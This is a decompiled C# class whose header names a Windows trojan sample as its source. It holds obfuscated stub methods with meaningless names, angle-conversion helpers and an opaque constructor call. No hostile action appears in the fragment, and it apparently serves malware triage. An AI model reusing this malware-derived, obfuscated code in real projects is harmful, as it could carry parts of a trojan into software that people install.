// Decompiled with JetBrains decompiler
// Type: TYPELIBA.Importers.StateProcess
// Assembly: TYPELIBA, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 97BB50BA-9882-4DFE-999C-7A4E4B448F1C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-080eff3ceefca287dc59d176676559ae1aa3f1faec807805114bae214a11f586.exe

using ProjNet.Rules;
using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using TYPELIBA.Identifiers;
using TYPELIBA.Serialization;

namespace TYPELIBA.Importers
{
  public abstract class StateProcess : RepositoryProcess
  {
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public virtual int ManageConfiguration() => throw new NotImplementedException();

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public virtual int ListConfiguration() => throw new NotImplementedException();

    [MethodImpl(MethodImplOptions.NoInlining)]
    public virtual bool PopConfiguration() => throw new NotImplementedException();

    [SpecialName]
    public abstract string RevertError();

    [SpecialName]
    public abstract string InterruptState();

    [MethodImpl(MethodImplOptions.NoInlining)]
    public virtual double[,] CheckConfiguration(double[] var1) => throw new NotImplementedException();

    [MethodImpl(MethodImplOptions.NoInlining)]
    public virtual List<double> CancelConfiguration(List<double> asset) => throw new NotImplementedException();

    [MethodImpl(MethodImplOptions.NoInlining)]
    public virtual CopyFileFlags DeleteConfiguration(List<double> task) => throw new NotImplementedException();

    public abstract RepositoryProcess CreateState();

    public abstract double[] DisableConfiguration(double[] v);

    public abstract List<double[]> SearchConfiguration(List<double[]> i);

    public abstract void ValidateConfiguration();

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected static double PopConsumer(double init) => Math.PI / 180.0 * init;

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected static double CheckConsumer(double instance) => 180.0 / Math.PI * instance;

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected StateProcess()
    {
      ManagerParamsID.NewExpression();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool RegisterDescriptor() => true;

    internal static bool RevertDescriptor() => false;
  }
}
